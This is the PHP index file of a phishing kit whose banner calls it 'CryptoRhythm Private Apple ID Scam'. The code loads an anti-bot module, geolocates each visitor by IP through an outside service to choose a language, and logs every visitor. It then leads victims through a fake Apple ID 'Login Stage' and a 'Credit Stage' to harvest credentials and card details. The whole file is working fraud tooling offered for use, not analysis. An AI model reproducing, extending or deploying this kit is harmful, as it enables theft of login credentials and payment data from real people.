<?php
session_start();
require_once("antibots.php");
/*


   ______                           _          _______     __                _   __
 .' ___  |                         / |_       |_   __ \   [  |              / |_[  |
/ .'   \_| _ .--.  _   __  _ .--. `| |-' .--.   | |__) |   | |--.    _   __`| |-'| |--.   _ .--..--.
| |       [ `/'`\][ \ [  ][ '/'`\ \| | / .'`\ \ |  __ /    | .-. |  [ \ [  ]| |  | .-. | [ `.-. .-. |
\ `.___.'\ | |     \ '/ /  | \__/ || |,| \__. |_| |  \ \_  | | | |   \ '/ / | |, | | | |  | | | | | |
 `.____ .'[___]  [\_:  /   | ;.__/ \__/ '.__.'|____| |___|[___]|__][\_:  /  \__/[___]|__][___||__||__]
                  \__.'   [__|                                      \__.'

                    Deceive the rich and powerful if you will, but don't insult them.

                              CryptoRhythm Private Apple ID Scam
                                    Scam Version : 0.1
                                   Tracker Version : 0.2
*/

define("INC", "true");
require_once("system/system.inc.php");
if($_setup) {
  require_once("inc/config.inc.php");
  require_once("inc/cryptodb.inc.php");
  require_once("inc/encryption.inc.php");
  require_once("track/module.php");
  if(!isset($_SESSION['country_code']) && !isset($_SESSION['country_language'])) {
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = @$_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP)){
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP)){
        $_SESSION['_ip_'] = $ip = $forward;
    }
    else{
        $_SESSION['_ip_'] = $ip = $remote;
    }
    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$_SESSION['_ip_']));
    if($ip_data && $ip_data->geoplugin_countryCode != null){
        $countrycode = $ip_data->geoplugin_countryCode;
        $cd = strtolower($countrycode);
        $_SESSION['country_code'] = $cd;
        if($cd == "dz" || $cd == "be" || $cd == "bj" || $cd == "bf" || $cd == "ca" || $cd == "td" || $cd == "cd" || $cd == "lu" || $cd == "ch" ||
        $cd == "gw" || $cd == "mg" || $cd == "ml" || $cd == "mu" || $cd == "ma" || $cd == "ne" || $cd == "sn" || $cd == "sc" || $cd == "tn" ||
        $cd == "fr" || $cd == "pg") {
          $_SESSION['country_code'] = $cd;
          $_SESSION['country_language'] = "fr";
        } else if($cd == "cn" || $cd == "hk" || $cd == "mo" || $cd == "sg" || $cd == "tw" || $cd == "id" || $cd == "ml" || $cd == "th") {
          $_SESSION['country_code'] = $cd;
          $_SESSION['country_language'] = "cn";
        } else if($cd == "sp" || $cd == "ar" || $cd == "bo" || $cd == "cl" || $cd == "co" || $cd == "cr" || $cd == "dp" || $cd == "ec" || $cd == "sv"
        || $cd == "gt" || $cd == "hn" || $cd == "mx" || $cd == "ni" || $cd == "pa" || $cd == "py" || $cd == "pe" || $cd == "uy" || $cd == "ve") {
          $_SESSION['country_code'] = $cd;
          $_SESSION['country_language'] = "sp";
        } else if($cd == "pt" || $cd == "ao" || $cd == "br" || $cd == "cv" || $cd == "mz" || $cd == "mo" || $cd == "st") {
          $_SESSION['country_code'] = $cd;
          $_SESSION['country_language'] = "pt";
        } else {
          $_SESSION['country_code'] = $cd;
          $_SESSION['country_language'] = "en";
        }
    } else {
      $_SESSION['country_code'] = "usa";
      $_SESSION['country_language'] = "en";
    }
  }

  if(!isset($_GET['web_session'])) {
    savevisitor("visitor", "Login Stage");
    ?>
    <script type="text/javascript">
      window.location = "?web_session=<?php echo md5(rand()); ?>";
    </script>
    <?php
  } else {
    if(!isset($_SESSION['_step_'])) {
      $_SESSION['_step_'] = "1";
    }
    $step = $_SESSION['_step_'];
    switch($step) {
      case "1":
        savevisitor("visitor", "Login Stage");
        require("login.php");
        break;
      case "2":
        savevisitor("visitor", "Credit Stage");
        require("account/index.php");
        break;
    }
  }
} else {
  ?>
  <script type="text/javascript">
    window.location = "install";
  </script>
  <?php
}
?>
